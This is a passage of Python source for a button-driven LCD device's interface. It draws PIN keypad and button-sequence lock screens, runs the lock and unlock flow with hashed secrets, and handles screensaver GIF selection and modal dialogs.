        cell_w = max(24, min(72, (card_w - inner_pad * 2 - cell_gap_x * 2) // 3))
        cell_h = max(11, (kp_avail_h - cell_gap_y * 3) // 4)
        total_kp_w = (cell_w * 3) + (cell_gap_x * 2)
        start_x = cx0 + (card_w - total_kp_w) // 2

        for row_index, row in enumerate(keypad):
            for col_index, key in enumerate(row):
                x0 = start_x + (col_index * (cell_w + cell_gap_x))
                y0 = kp_top + (row_index * (cell_h + cell_gap_y))
                x1 = x0 + cell_w
                y1 = y0 + cell_h
                is_selected = row_index == selected_row and col_index == selected_col
                fill = color.accent if is_selected else color.elevated
                outline = color.selected_text if is_selected else color.border_subtle
                text_fill = rj_theme.EMBER_THEME["text_on_accent"] if is_selected else color.text
                rj_theme.draw_card(draw, (x0, y0, x1, y1), fill=fill, outline=outline, radius=4)
                key_font = title_font if len(key) == 1 else small_font
                kb = draw.textbbox((0, 0), key, font=key_font)
                tx = x0 + (cell_w - (kb[2] - kb[0])) // 2 - kb[0]
                ty = y0 + (cell_h - (kb[3] - kb[1])) // 2 - kb[1]
                draw.text((tx, ty), key, fill=text_fill, font=key_font)

        _draw_footer_bar("Type digits / Arrows+Enter" + ("  Esc:Cancel" if allow_cancel else ""))
        mark_display_dirty()
    finally:
        draw_lock.release()


def _draw_sequence_screen(title: str, prompt: str, entered: list[str] | None = None,
                          allow_cancel: bool = True, allow_hide: bool = False,
                          mask_entered: bool = False) -> None:
    entered = entered or []
    controls = "Enter:Clear  Esc/K3:Back" if allow_cancel else "Enter:Clear  K3:Hide"
    try:
        draw_lock.acquire()
        draw.rectangle((0, 0, _SCR_W - 1, _SCR_H - 1), fill=color.background)
        _draw_toolbar()

        avail_h = _CONTENT_Y1 - _CONTENT_Y0
        card_w = min(_SCR_W - _UI_PAD * 2, max(118, int(_SCR_W * 0.72)))
        card_h = min(avail_h - 4, max(82, int(avail_h * 0.78)))
        cx0 = (_SCR_W - card_w) // 2
        cy0 = _CONTENT_Y0 + max(2, (avail_h - card_h) // 2)
        cx1 = cx0 + card_w
        cy1 = cy0 + card_h
        rj_theme.draw_card(draw, (cx0, cy0, cx1, cy1), fill=color.surface, outline=color.border, radius=8 if not _IS_COMPACT else 4)

        pad = max(6, card_w // 20)
        draw.text((cx0 + pad, cy0 + 6), _truncate_to_width(title, card_w - 50, title_font), fill=color.selected_text, font=title_font)
        progress_text = f"{len(entered)}/{LOCK_SEQUENCE_LENGTH}"
        pb = draw.textbbox((0, 0), progress_text, font=title_font)
        draw.text((cx1 - pad - (pb[2] - pb[0]), cy0 + 6), progress_text, fill=color.accent, font=title_font)

        prompt_y = cy0 + _TITLE_PX + 12
        _draw_centered_text((cx0 + pad, prompt_y, cx1 - pad, prompt_y + _SMALL_PX + 8), prompt, fill=color.text_muted, font=small_font)

        slot_gap = max(3, min(8, card_w // 48))
        slot_w = max(15, min(42, (card_w - pad * 2 - slot_gap * (LOCK_SEQUENCE_LENGTH - 1)) // LOCK_SEQUENCE_LENGTH))
        slot_h = max(18, min(36, card_h // 4))
        total_w = (slot_w * LOCK_SEQUENCE_LENGTH) + (slot_gap * (LOCK_SEQUENCE_LENGTH - 1))
        slot_x = cx0 + (card_w - total_w) // 2
        slot_y = cy0 + (card_h - slot_h) // 2
        for index in range(LOCK_SEQUENCE_LENGTH):
            x0 = slot_x + (index * (slot_w + slot_gap))
            x1 = x0 + slot_w
            y0 = slot_y
            y1 = y0 + slot_h
            filled = index < len(entered)
            fill = color.select if filled else color.well
            outline = color.accent if filled else color.border_subtle
            if filled:
                token = "●" if mask_entered else LOCK_SEQUENCE_TOKENS.get(entered[index], "?")
            else:
                token = "·"
            text_fill = color.selected_text if filled else color.text_dim
            rj_theme.draw_card(draw, (x0, y0, x1, y1), fill=fill, outline=outline, radius=4)
            _draw_centered_text((x0, y0, x1, y1), token, fill=text_fill, font=title_font)

        info_y = slot_y + slot_h + 8
        if entered and not mask_entered:
            latest = LOCK_SEQUENCE_LABELS.get(entered[-1], "")
            _draw_centered_text((cx0 + pad, info_y, cx1 - pad, cy1 - 6), f"Last input: {latest}", fill=color.selected_text, font=small_font)
        elif entered:
            _draw_centered_text((cx0 + pad, info_y, cx1 - pad, cy1 - 6), "Sequence input recorded", fill=color.text_muted, font=small_font)

        _draw_footer_bar(controls)
        mark_display_dirty()
    finally:
        draw_lock.release()


def _show_lock_wake_screen(reason: str = "Locked") -> None:
    try:
        draw_lock.acquire()
        draw.rectangle((0, 0, _SCR_W - 1, _SCR_H - 1), fill=color.background)
        _draw_toolbar()

        avail_h = _CONTENT_Y1 - _CONTENT_Y0
        card_w = min(_SCR_W - _UI_PAD * 2, max(110, int(_SCR_W * 0.56)))
        card_h = min(avail_h - 8, max(80, int(avail_h * 0.68)))
        cx0 = (_SCR_W - card_w) // 2
        cy0 = _CONTENT_Y0 + (avail_h - card_h) // 2
        cx1 = cx0 + card_w
        cy1 = cy0 + card_h
        rj_theme.draw_card(draw, (cx0, cy0, cx1, cy1), fill=color.surface, outline=color.border, radius=10 if not _IS_COMPACT else 4, accent_left=color.accent, accent_width=3)

        lock_icon = MENU_ICONS.get(" Lock", "\uf023")
        icon_px = max(20, min(40, card_h // 3))
        lock_icon_font = rj_env.load_font(icon_px, icon=True)
        mid_x = _SCR_W // 2
        draw.text((mid_x, cy0 + card_h // 3), lock_icon, font=lock_icon_font, fill=color.selected_text, anchor="mm")
        _draw_centered_text((cx0 + 8, cy0 + card_h // 2 + 4, cx1 - 8, cy0 + card_h // 2 + _TITLE_PX + 10), reason, fill=rj_theme.EMBER_THEME["text_bright"], font=title_font)
        _draw_centered_text((cx0 + 8, cy1 - _SMALL_PX - 12, cx1 - 8, cy1 - 4), "Press any key to unlock", fill=color.text_muted, font=small_font)
        _draw_footer_bar("Device Locked")
        mark_display_dirty()
    finally:
        draw_lock.release()


def _draw_lock_screensaver_frame(frame: Image.Image) -> None:
    try:
        draw_lock.acquire()
        image.paste(frame)
        lock_icon = MENU_ICONS.get(" Lock", "\uf023")
        lock_icon_font = rj_env.load_font(max(12, _ICON_PX), icon=True)
        draw.text((_SCR_W - 8, 4), lock_icon, fill=color.selected_text, font=lock_icon_font, anchor="ra")
        mark_display_dirty()
    finally:
        draw_lock.release()


def _get_fresh_lock_button() -> str | None:
    virtual_button = rj_input.get_virtual_button()
    if virtual_button:
        _log_virtual_consume("fresh_lock", virtual_button)
        _mark_user_activity()
        return virtual_button
    try:
        for item in PINS:
            if GPIO.input(PINS[item]) == 0:
                _mark_user_activity()
                return item
    except Exception:
        return None
    return None


def _get_sequence_lock_button(held_buttons: set[str]) -> tuple[str | None, set[str]]:
    virtual_button = rj_input.get_virtual_button()
    if virtual_button:
        _log_virtual_consume("sequence_lock", virtual_button)
        _mark_user_activity()
        return virtual_button, held_buttons

    current_held: set[str] = set()
    try:
        for item in PINS:
            if GPIO.input(PINS[item]) == 0:
                current_held.add(item)
    except Exception:
        return None, held_buttons

    for button in ("KEY_PRESS_PIN", "KEY3_PIN", *LOCK_SEQUENCE_ALLOWED_BUTTONS):
        if button in current_held and button not in held_buttons:
            _mark_user_activity()
            return button, current_held

    return None, current_held


def _load_lock_screensaver_frames() -> tuple[list[Image.Image], list[float]]:
    screensaver_path = str(default.screensaver_gif or "").strip()
    if not screensaver_path or not os.path.isfile(screensaver_path):
        return [], []

    try:
        mtime = os.path.getmtime(screensaver_path)
    except OSError:
        return [], []

    if (
        _lock_screensaver_cache["path"] == screensaver_path
        and _lock_screensaver_cache["mtime"] == mtime
        and _lock_screensaver_cache["frames"]
    ):
        return _lock_screensaver_cache["frames"], _lock_screensaver_cache["durations"]

    frames: list[Image.Image] = []
    durations: list[float] = []
    try:
        with Image.open(screensaver_path) as gif:
            for gif_frame in ImageSequence.Iterator(gif):
                prepared = gif_frame.convert("RGB").resize((LCD.width, LCD.height))
                frames.append(prepared.copy())
                duration_ms = gif_frame.info.get("duration") or gif.info.get("duration") or 100
                durations.append(max(0.08, float(duration_ms) / 1000.0))
    except Exception:
        frames = []
        durations = []

    _lock_screensaver_cache["path"] = screensaver_path
    _lock_screensaver_cache["mtime"] = mtime if frames else None
    _lock_screensaver_cache["frames"] = frames
    _lock_screensaver_cache["durations"] = durations
    return frames, durations


def _play_lock_screensaver_until_input(reason: str = "Locked") -> str:
    _show_lock_wake_screen(reason)
    static_deadline = time.monotonic() + LOCK_SCREEN_STATIC_SECONDS
    last_req_check = 0.0
    while time.monotonic() < static_deadline:
        now = time.monotonic()
        if (now - last_req_check) >= 0.25:
            last_req_check = now
            requested = _check_payload_request()
            if requested:
                lock_runtime["locked"] = False
                exec_payload(requested)
                return ""
        button = _get_fresh_lock_button()
        if button:
            return button
        time.sleep(0.035)

    frames, durations = _load_lock_screensaver_frames()
    if not frames:
        while True:
            now = time.monotonic()
            if (now - last_req_check) >= 0.25:
                last_req_check = now
                requested = _check_payload_request()
                if requested:
                    lock_runtime["locked"] = False
                    exec_payload(requested)
                    return ""
            button = _get_fresh_lock_button()
            if button:
                return button
            time.sleep(0.04)

    lock_runtime["showing_screensaver"] = True
    try:
        frame_index = 0
        while True:
            _draw_lock_screensaver_frame(frames[frame_index])
            frame_deadline = time.monotonic() + durations[frame_index]
            while time.monotonic() < frame_deadline:
                now = time.monotonic()
                if (now - last_req_check) >= 0.25:
                    last_req_check = now
                    requested = _check_payload_request()
                    if requested:
                        lock_runtime["locked"] = False
                        lock_runtime["showing_screensaver"] = False
                        exec_payload(requested)
                        return ""
                button = _get_fresh_lock_button()
                if button:
                    return button
                time.sleep(min(0.04, max(0.005, frame_deadline - now)))
            frame_index = (frame_index + 1) % len(frames)
    finally:
        lock_runtime["showing_screensaver"] = False


def _enter_pin_via_keypad(title: str, prompt: str, allow_cancel: bool = True,
                          allow_hide: bool = False) -> str | None:
    keypad = (("1", "2", "3"), ("4", "5", "6"), ("7", "8", "9"), ("C", "0", "OK"))
    entered: list[str] = []
    row = 0
    col = 0
    hint = prompt
    previous_suspend = bool(lock_runtime["suspend_auto_lock"])
    lock_runtime["suspend_auto_lock"] = True
    try:
        while True:
            _draw_lock_screen(title, hint, entered, (row, col), allow_cancel=allow_cancel)
            btn = getButton()
            if isinstance(btn, str) and btn.startswith("_KB_"):
                kv = btn[4:]
                if kv == "BACKSPACE":
                    if entered:
                        entered.pop()
                    hint = prompt
                elif kv == "ESCAPE":
                    if allow_cancel:
                        return None
                    if allow_hide:
                        return "__hide__"
                elif kv == "ENTER":
                    if len(entered) == 4:
                        return "".join(entered)
                    hint = "Need 4 digits"
                elif len(kv) == 1 and kv.isdigit() and len(entered) < 4:
                    entered.append(kv)
                    if len(entered) == 4:
                        return "".join(entered)
                    hint = prompt
                continue
            if btn == "KEY_UP_PIN":
                row = (row - 1) % len(keypad)
            elif btn == "KEY_DOWN_PIN":
                row = (row + 1) % len(keypad)
            elif btn == "KEY_LEFT_PIN":
                col = (col - 1) % len(keypad[0])
            elif btn == "KEY_RIGHT_PIN":
                col = (col + 1) % len(keypad[0])
            elif btn == "KEY1_PIN":
                if entered:
                    entered.pop()
                hint = prompt
            elif btn == "KEY3_PIN":
                if allow_cancel:
                    return None
                if allow_hide:
                    return "__hide__"
            elif btn in ("KEY2_PIN", "KEY_PRESS_PIN"):
                action = keypad[row][col]
                if action == "C":
                    if entered:
                        entered.pop()
                    hint = prompt
                elif action == "OK":
                    if len(entered) == 4:
                        return "".join(entered)
                    hint = "Need 4 digits"
                elif len(entered) < 4:
                    entered.append(action)
                    if len(entered) == 4:
                        return "".join(entered)
                    hint = prompt
    finally:
        lock_runtime["suspend_auto_lock"] = previous_suspend


def _enter_sequence_via_buttons(title: str, prompt: str, allow_cancel: bool = True,
                                allow_hide: bool = False,
                                mask_entered: bool = False) -> list[str] | str | None:
    entered: list[str] = []
    hint = prompt
    last_button = None
    last_press_at = 0.0
    held_buttons: set[str] = set()
    needs_redraw = True
    previous_suspend = bool(lock_runtime["suspend_auto_lock"])
    lock_runtime["suspend_auto_lock"] = True
    try:
        _wait_for_button_release(timeout=0.35)
        while True:
            if needs_redraw:
                _draw_sequence_screen(
                    title,
                    hint,
                    entered,
                    allow_cancel=allow_cancel,
                    allow_hide=allow_hide,
                    mask_entered=mask_entered,
                )
                needs_redraw = False
            btn, held_buttons = _get_sequence_lock_button(held_buttons)
            if not btn:
                time.sleep(0.02)
                continue

            now = time.monotonic()

            if btn == "KEY3_PIN":
                if allow_cancel:
                    return None
                if allow_hide:
                    return "__hide__"
                continue

            if btn == "KEY_PRESS_PIN":
                if entered:
                    entered.pop()
                hint = prompt
                last_button = btn
                last_press_at = now
                needs_redraw = True
                continue

            if btn not in LOCK_SEQUENCE_ALLOWED_BUTTONS:
                continue

            if btn == last_button and (now - last_press_at) < LOCK_SEQUENCE_DEBOUNCE:
                continue

            entered.append(btn)
            last_button = btn
            last_press_at = now
            hint = prompt
            needs_redraw = True
            if len(entered) >= LOCK_SEQUENCE_LENGTH:
                return entered.copy()
    finally:
        lock_runtime["suspend_auto_lock"] = previous_suspend


def _set_pin_flow(require_current: bool = False) -> bool:
    if require_current:
        current = _enter_pin_via_keypad("Change PIN", "Current PIN", allow_cancel=True)
        if current is None:
            return False
        if not _verify_pin(current, str(lock_config.get("pin_hash") or "")):
            Dialog_info("Wrong current PIN", wait=False, timeout=1.2)
            return False

    while True:
        first_pin = _enter_pin_via_keypad("Set PIN", "Enter new 4-digit PIN", allow_cancel=True)
        if first_pin is None:
            return False
        confirm_pin = _enter_pin_via_keypad("Confirm PIN", "Re-enter PIN", allow_cancel=True)
        if confirm_pin is None:
            return False
        if first_pin != confirm_pin:
            Dialog_info("PIN mismatch", wait=False, timeout=1.2)
            continue
        lock_config["pin_hash"] = _hash_pin(first_pin)
        SaveConfig()
        Dialog_info("PIN saved", wait=False, timeout=1.0)
        return True


def _set_sequence_flow(require_current: bool = False) -> bool:
    if require_current:
        current = _enter_sequence_via_buttons("Change Sequence", "Current 6-step seq", allow_cancel=True)
        if current is None:
            return False
        if not _verify_sequence(current, str(lock_config.get("sequence_hash") or "")):
            Dialog_info("Wrong current\nsequence", wait=False, timeout=1.2)
            return False

    while True:
        first_sequence = _enter_sequence_via_buttons("Set Sequence", "Enter new 6-step", allow_cancel=True)
        if first_sequence is None:
            return False
        confirm_sequence = _enter_sequence_via_buttons("Confirm Sequence", "Repeat 6-step", allow_cancel=True)
        if confirm_sequence is None:
            return False
        if first_sequence != confirm_sequence:
            Dialog_info("Sequence\nmismatch", wait=False, timeout=1.2)
            continue
        lock_config["sequence_hash"] = _hash_sequence(first_sequence)
        SaveConfig()
        Dialog_info("Sequence saved", wait=False, timeout=1.0)
        return True


def _verify_current_lock_secret_flow() -> bool:
    if not _lock_has_secret():
        return True
    if _lock_mode() == LOCK_MODE_SEQUENCE:
        current = _enter_sequence_via_buttons("Verify Sequence", "Enter current 6-step", allow_cancel=True, mask_entered=True)
        if current is None:
            return False
        if not _verify_sequence(current, str(lock_config.get("sequence_hash") or "")):
            Dialog_info("Wrong current\nsequence", wait=False, timeout=1.2)
            return False
        return True

    current_pin = _enter_pin_via_keypad("Verify PIN", "Current PIN", allow_cancel=True)
    if current_pin is None:
        return False
    if not _verify_pin(current_pin, str(lock_config.get("pin_hash") or "")):
        Dialog_info("Wrong current PIN", wait=False, timeout=1.2)
        return False
    return True


def _set_active_lock_secret_flow(require_current: bool = False) -> bool:
    if _lock_mode() == LOCK_MODE_SEQUENCE:
        return _set_sequence_flow(require_current=require_current)
    return _set_pin_flow(require_current=require_current)


def _select_lock_mode() -> None:
    labels = [" PIN", " Sequence"]
    current_mode = _lock_mode()
    idx, _value = GetMenuString(labels, duplicates=True)
    if idx == -1:
        return
    target_mode = LOCK_MODE_SEQUENCE if idx == 1 else LOCK_MODE_PIN
    if target_mode == current_mode:
        return

    previous_mode = current_mode
    if _lock_has_secret() and not _verify_current_lock_secret_flow():
        return

    lock_config["mode"] = target_mode
    if not _lock_has_secret(target_mode):
        if not _set_active_lock_secret_flow(require_current=False):
            lock_config["mode"] = previous_mode
            return

    SaveConfig()
    Dialog_info(f"Lock type\n{_lock_mode_label(target_mode)}", wait=False, timeout=1.0)


def configure_auto_lock_timeout() -> None:
    labels = [f" {label}" for _, label in LOCK_TIMEOUT_OPTIONS]
    current_value = int(lock_config.get("auto_lock_seconds") or 0)
    while True:
        selected_index = 0
        for index, (value, _label) in enumerate(LOCK_TIMEOUT_OPTIONS):
            if value == current_value:
                selected_index = index
                break
        idx, _value = GetMenuString(labels, duplicates=True)
        if idx == -1:
            return
        current_value = LOCK_TIMEOUT_OPTIONS[idx][0]
        lock_config["auto_lock_seconds"] = current_value
        SaveConfig()
        Dialog_info(f"Auto-lock\n{_lock_timeout_label(current_value)}", wait=False, timeout=1.0)
        return


def _load_gif_frames(gif_path: str) -> tuple[list[Image.Image], list[float]]:
    """Load a GIF into frames + durations for preview."""
    frames: list[Image.Image] = []
    durations: list[float] = []
    try:
        with Image.open(gif_path) as gif:
            for f in ImageSequence.Iterator(gif):
                prepared = f.convert("RGB").resize((LCD.width, LCD.height))
                frames.append(prepared.copy())
                dur = f.info.get("duration") or gif.info.get("duration") or 100
                durations.append(max(0.04, float(dur) / 1000.0))
    except Exception:
        return [], []
    return frames, durations


def _preview_gif_browser(gif_files: list[str], screensaver_dir: str, start_index: int) -> tuple[str, int]:
    """Preview GIFs with LEFT/RIGHT to browse, KEY1 to return to list, OK to select.
    Returns (selected_path, current_index) or ("", index) if cancelled."""
    idx = start_index
    frames, durations = [], []
    frame_idx = 0
    need_load = True

    while True:
        if need_load:
            gif_path = os.path.join(screensaver_dir, gif_files[idx])
            Dialog_info(f"Loading...\n{gif_files[idx][:18]}", wait=False)
            frames, durations = _load_gif_frames(gif_path)
            if not frames:
                Dialog_info("Cannot load GIF", wait=False, timeout=1.0)
                return "", idx
            frame_idx = 0
            need_load = False

        try:
            draw_lock.acquire()
            image.paste(frames[frame_idx])
            # Show GIF name at bottom
            draw.rectangle((0, _SCR_H - S(14), _SCR_W, _SCR_H), fill="#000000")
            draw.text((S(2), _SCR_H - S(12)), gif_files[idx][:20], fill="#888888", font=text_font)
            mark_display_dirty()
        finally:
            draw_lock.release()

        time.sleep(durations[frame_idx])
        frame_idx = (frame_idx + 1) % len(frames)

        btn = _get_fresh_lock_button()
        if btn == "KEY1_PIN":
            return "", idx
        elif btn == "KEY3_PIN":
            return "", idx
        elif btn == "KEY_PRESS_PIN":
            return os.path.join(screensaver_dir, gif_files[idx]), idx
        elif btn == "KEY_LEFT_PIN" or btn == "KEY_UP_PIN":
            idx = (idx - 1) % len(gif_files)
            need_load = True
            time.sleep(0.2)
        elif btn == "KEY_RIGHT_PIN" or btn == "KEY_DOWN_PIN":
            idx = (idx + 1) % len(gif_files)
            need_load = True
            time.sleep(0.2)


def select_lock_screensaver_gif() -> None:
    screensaver_dir = os.path.join(default.install_path, "img", "screensaver")
    os.makedirs(screensaver_dir, exist_ok=True)

    try:
        gif_files = sorted(
            f for f in os.listdir(screensaver_dir) if f.lower().endswith(".gif")
        )
    except Exception:
        gif_files = []

    if not gif_files:
        Dialog_info("No GIF found\nin screensaver\nfolder", wait=False, timeout=1.2)
        return

    # Show list, select → opens preview browser at that index
    menu_items = [f" {g}" for g in gif_files]
    result = GetMenuString(menu_items, duplicates=True)
    if isinstance(result, tuple):
        gif_index, selected_text = result
    else:
        selected_text = result
        gif_index = 0
    if not selected_text or selected_text == "":
        return

    gif_name = selected_text.strip()
    try:
        gif_index = gif_files.index(gif_name)
    except ValueError:
        gif_index = 0

    # Enter preview browser: LEFT/RIGHT browse, OK selects, KEY1/KEY3 go back
    selected_path, _ = _preview_gif_browser(gif_files, screensaver_dir, gif_index)
    color.DrawMenuBackground()
    color.DrawBorder()

    if selected_path:
        default.screensaver_gif = selected_path
        SaveConfig()
        Dialog_info("Setting screensaver\nLoading GIF...", wait=False)
        _load_lock_screensaver_frames()
        Dialog_info(f"Screensaver set\n{os.path.basename(selected_path)[:18]}", wait=False, timeout=1.2)


def toggle_lock_enabled() -> None:
    if not _lock_has_secret():
        if not _set_active_lock_secret_flow(require_current=False):
            return
    lock_config["enabled"] = not bool(lock_config.get("enabled"))
    SaveConfig()
    status = "Lock enabled" if lock_config["enabled"] else "Lock disabled"
    Dialog_info(status, wait=False, timeout=1.0)


def lock_device(reason: str = "Locked") -> bool:
    _apply_random_screensaver()
    if not _lock_has_secret():
        return False
    if lock_runtime["locked"]:
        return True

    lock_runtime["locked"] = True
    previous_suspend = bool(lock_runtime["suspend_auto_lock"])
    lock_runtime["in_lock_flow"] = True
    lock_runtime["suspend_auto_lock"] = True
    try:
        show_keypad = False
        _wait_for_button_release()
        while True:
            if not show_keypad:
                result = _play_lock_screensaver_until_input(reason)
                if result == "":
                    return True
                _wait_for_button_release()
                show_keypad = True
                continue

            if _lock_mode() == LOCK_MODE_SEQUENCE:
                entered = _enter_sequence_via_buttons("Unlock", "Enter 6-step seq", allow_cancel=False, allow_hide=True, mask_entered=True)
            else:
                entered = _enter_pin_via_keypad("Unlock", "Enter 4-digit PIN", allow_cancel=False, allow_hide=True)
            if entered == "__hide__":
                _wait_for_button_release()
                show_keypad = False
                continue
            if _lock_mode() == LOCK_MODE_SEQUENCE:
                stored_sequence_hash = str(lock_config.get("sequence_hash") or "")
                if entered and _verify_sequence(entered, stored_sequence_hash):
                    _rehash_sequence_if_needed(entered, stored_sequence_hash)
                    lock_runtime["locked"] = False
                    _mark_user_activity()
                    RenderCurrentMenuOnce()
                    return True
                Dialog_info("Wrong sequence", wait=False, timeout=1.0)
                continue
            stored_pin_hash = str(lock_config.get("pin_hash") or "")
            if entered and _verify_pin(entered, stored_pin_hash):
                _rehash_pin_if_needed(entered, stored_pin_hash)
                lock_runtime["locked"] = False
                _mark_user_activity()
                RenderCurrentMenuOnce()
                return True
            Dialog_info("Wrong PIN", wait=False, timeout=1.0)
    finally:
        lock_runtime["showing_screensaver"] = False
        lock_runtime["in_lock_flow"] = False
        lock_runtime["suspend_auto_lock"] = previous_suspend


_random_screensaver = False  # when True, pick random GIF on each lock


def _toggle_random_screensaver():
    global _random_screensaver
    _random_screensaver = not _random_screensaver
    state = "ON" if _random_screensaver else "OFF"
    SaveConfig()
    Dialog_info(f"Random screensaver\n{state}", wait=False, timeout=1.2)


def _apply_random_screensaver():
    """If random mode is on, pick a random GIF before showing lock screen."""
    if not _random_screensaver:
        return
    screensaver_dir = os.path.join(default.install_path, "img", "screensaver")
    try:
        gifs = [f for f in os.listdir(screensaver_dir) if f.lower().endswith(".gif")]
        if gifs:
            import random as _rnd
            chosen = _rnd.choice(gifs)
            default.screensaver_gif = os.path.join(screensaver_dir, chosen)
    except Exception:
        pass


def OpenLockMenu() -> None:
    while True:
        rand_label = "ON" if _random_screensaver else "OFF"
        options = [
            " Lock now",
            f" {'Deactivate' if lock_config.get('enabled') else 'Activate'} lock",
            f" Lock type: {_lock_mode_label()}",
            f" Change {_lock_mode_label()}",
            f" Auto-lock: {_lock_timeout_label()}",
            " Screensaver GIF",
            f" Random screensaver: {rand_label}",
        ]
        idx, _value = GetMenuString(options, duplicates=True)
        if idx == -1:
            return
        if idx == 0:
            _apply_random_screensaver()
            if not _lock_has_secret() and not _set_active_lock_secret_flow(require_current=False):
                continue
            lock_device("Locked")
        elif idx == 1:
            toggle_lock_enabled()
        elif idx == 2:
            _select_lock_mode()
        elif idx == 3:
            _set_active_lock_secret_flow(require_current=_lock_has_secret())
        elif idx == 4:
            configure_auto_lock_timeout()
        elif idx == 5:
            select_lock_screensaver_gif()
        elif idx == 6:
            _toggle_random_screensaver()

### Simple message box (Obsidian Ember Modal Card) ###
# (Text, Wait for confirmation)  #
def _modal_bounds(width_ratio=0.72, height_ratio=0.58):
    avail_h = _CONTENT_Y1 - _CONTENT_Y0
    mw = min(_SCR_W - _UI_PAD * 2, max(112, int(_SCR_W * width_ratio)))
    mh = min(avail_h - 6, max(76, int(avail_h * height_ratio)))
    mx0 = (_SCR_W - mw) // 2
    my0 = _CONTENT_Y0 + max(2, (avail_h - mh) // 2)
    return mx0, my0, mx0 + mw, my0 + mh


def Dialog(a, wait=True):
    try:
        draw_lock.acquire()
        _draw_toolbar()
        color.DrawMenuBackground()
        mx0, my0, mx1, my1 = _modal_bounds(0.68 if _IS_WIDESCREEN else 0.88, 0.56 if _IS_WIDESCREEN else 0.64)
        rj_theme.draw_card(draw, (mx0, my0, mx1, my1), fill=color.surface, outline=color.border, radius=8 if not _IS_COMPACT else 4, accent_left=color.accent, accent_width=3)
        btn_h = max(18, _ROW_H - 2)
        btn_w = max(56, min(110, (mx1 - mx0) // 3))
        bx0 = (mx0 + mx1 - btn_w) // 2
        by1 = my1 - max(8, _UI_PAD)
        by0 = by1 - btn_h
        _draw_centered_text((mx0 + 10, my0 + 8, mx1 - 10, by0 - 6), str(a).strip(), fill=color.text, font=text_font)
        rj_theme.draw_card(draw, (bx0, by0, bx0 + btn_w, by1), fill=color.accent, outline=color.selected_text, radius=5)
        _draw_centered_text((bx0, by0, bx0 + btn_w, by1), "OK", fill=rj_theme.EMBER_THEME["text_on_accent"], font=title_font)
        _draw_footer_bar("Enter / Any key to continue")
        mark_display_dirty()
        if screen_lock.is_set():
            try:
                LCD.LCD_ShowImage(image, 0, 0)
            except Exception:
                pass
    finally:
        draw_lock.release()
    if wait:
        time.sleep(0.2)
        getButton()


def Dialog_result(title, detail="", wait=True):
    try:
        draw_lock.acquire()
        _draw_toolbar()
        color.DrawMenuBackground()
        mx0, my0, mx1, my1 = _modal_bounds(0.72 if _IS_WIDESCREEN else 0.90, 0.66 if _IS_WIDESCREEN else 0.72)
        rj_theme.draw_card(draw, (mx0, my0, mx1, my1), fill=color.surface, outline=color.border, radius=8 if not _IS_COMPACT else 4, accent_left=color.accent, accent_width=3)
        hdr_h = _TITLE_PX + 10
        draw.rectangle((mx0 + 4, my0 + 1, mx1 - 1, my0 + hdr_h), fill=color.elevated)
        draw.line([(mx0 + 4, my0 + hdr_h), (mx1 - 1, my0 + hdr_h)], fill=color.border_subtle, width=1)
        _draw_centered_text((mx0 + 8, my0 + 2, mx1 - 8, my0 + hdr_h), str(title).strip(), fill=color.selected_text, font=title_font)

        btn_h = max(18, _ROW_H - 2)
        btn_w = max(58, min(110, (mx1 - mx0) // 3))
        bx0 = (mx0 + mx1 - btn_w) // 2
        by1 = my1 - max(8, _UI_PAD)
        by0 = by1 - btn_h
        if detail:
            _draw_centered_text((mx0 + 10, my0 + hdr_h + 6, mx1 - 10, by0 - 6), str(detail).strip(), fill=color.text, font=text_font)
        rj_theme.draw_card(draw, (bx0, by0, bx0 + btn_w, by1), fill=color.accent, outline=color.selected_text, radius=5)
        _draw_centered_text((bx0, by0, bx0 + btn_w, by1), "OK", fill=rj_theme.EMBER_THEME["text_on_accent"], font=title_font)
        _draw_footer_bar("Enter / Any key to continue")
        mark_display_dirty()
        if screen_lock.is_set():
            try:
                LCD.LCD_ShowImage(image, 0, 0)
            except Exception:
                pass
    finally:
        draw_lock.release()
    if wait:
        time.sleep(0.2)
        getButton()


def Dialog_info(a, wait=True, timeout=None):
    clean_msg = "\n".join(line.strip() for line in str(a or "").splitlines() if line.strip()) or str(a or "")

    def _paint(pct=None):
        draw_lock.acquire()
        try:
            _draw_toolbar()
            color.DrawMenuBackground()
            mx0, my0, mx1, my1 = _modal_bounds(0.68 if _IS_WIDESCREEN else 0.90, 0.56 if _IS_WIDESCREEN else 0.68)
            rj_theme.draw_card(draw, (mx0, my0, mx1, my1), fill=color.surface, outline=color.border, radius=8 if not _IS_COMPACT else 4, accent_left=color.accent, accent_width=3)
            bar_reserve = 20 if pct is not None else 6
            _draw_centered_text((mx0 + 10, my0 + 8, mx1 - 10, my1 - bar_reserve), clean_msg, fill=color.text, font=text_font)
            if pct is not None:
                bar_h = max(6, min(10, (my1 - my0) // 12))
                rj_theme.draw_progress_bar(
                    draw,
                    (mx0 + 14, my1 - bar_h - 8, mx1 - 14, my1 - 8),
                    pct,
                    fill=color.accent,
                    track=color.well,
                    outline=color.border_subtle,
                    radius=3,
                )
            _draw_footer_bar("Working..." if pct is not None else "Status")
            mark_display_dirty()
        finally:
            draw_lock.release()

    _paint(0.0 if (not wait and timeout) else None)
    if not wait and timeout:
        start = time.time()
        while time.time() - start < timeout:
            pct = min(1.0, (time.time() - start) / max(0.05, float(timeout)))
            _paint(pct)
            time.sleep(0.08)


### Yes or no dialog (Obsidian Ember Modal Card) ###
# (b is second text line)
def YNDialog(a="Are you sure?", y="Yes", n="No", b=""):
    mx0, my0, mx1, my1 = _modal_bounds(0.66 if _IS_WIDESCREEN else 0.90, 0.58 if _IS_WIDESCREEN else 0.68)
    btn_h = max(18, _ROW_H - 1)
    btn_gap = max(8, (mx1 - mx0) // 14)
    btn_w = max(42, min(110, ((mx1 - mx0) - btn_gap * 3) // 2))
    total_bw = btn_w * 2 + btn_gap
    left_bx0 = mx0 + ((mx1 - mx0) - total_bw) // 2
    right_bx0 = left_bx0 + btn_w + btn_gap
    by1 = my1 - max(8, _UI_PAD)
    by0 = by1 - btn_h

    def _paint(ans):
        draw_lock.acquire()
        try:
            _draw_toolbar()
            color.DrawMenuBackground()
            rj_theme.draw_card(draw, (mx0, my0, mx1, my1), fill=color.surface, outline=color.border, radius=8 if not _IS_COMPACT else 4, accent_left=color.accent, accent_width=3)
            msg = str(a).strip()
            if b and str(b).strip():
                _draw_centered_text((mx0 + 10, my0 + 8, mx1 - 10, by0 - _SMALL_PX - 12), msg, fill=color.selected_text, font=title_font)
                _draw_centered_text((mx0 + 10, by0 - _SMALL_PX - 14, mx1 - 10, by0 - 4), str(b).strip(), fill=color.text_muted, font=small_font)
            else:
